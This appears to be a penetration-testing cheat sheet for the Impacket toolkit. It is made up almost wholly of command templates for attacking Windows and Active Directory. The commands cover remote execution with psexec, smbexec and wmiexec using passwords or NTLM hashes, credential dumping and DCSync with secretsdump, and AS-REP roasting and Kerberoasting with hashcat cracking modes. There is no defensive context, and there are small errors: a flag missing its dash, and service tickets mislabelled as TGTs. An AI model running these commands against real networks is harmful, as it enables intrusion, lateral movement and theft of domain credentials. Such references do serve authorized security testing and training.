# impacket guide

## psexec | smbexec | wmiexec

```bash
impacket-psexec DOMAIN/USER:['PASS']@IP [-hashes :NTLMHASH]
impacket-smbexec DOMAIN/USER:['PASS']@IP [-hashes :NTLMHASH]
impacket-wmiexec DOMAIN/USER:['PASS']@IP [-hashes :NTLMHASH]
```

## secretsdump (dumps SAM / DCSync)

```bash
impacket-secretsdump DOMAIN/USER:['PASS']@IP [-just-dc] [just-dc-user USER]
# -just-dc: if IP is a domain-controller
```

## GetNPUsers

AS-REP Roasting (users with Kerberos pre-authentication disabled)

```bash
impacket-GetNPUsers DOMAIN/ -usersfile user.txt [-format hashcat] [-outputfile hash]
impacket-GetNPUsers DOMAIN/USER -no-pass -dc-ip IP [-format hashcat]
impacket-GetNPUsers -dc-ip IP -request DOMAIN/
```

## GetUserSPNs

Requesting TGTs for services to get all hashes

* msf: `use auxiliary/gather/get_user_spns`

```bash
impacket-GetUserSPNs DOMAIN/USER -hashes LM:NTLM_HASH -dc-ip DC_IP -request -outputfile hashes.kerberoast
impacket-GetUserSPNs DOMAIN/USER:['PASS'] -dc-ip DC_IP -request
# hashcat -m 13100
```
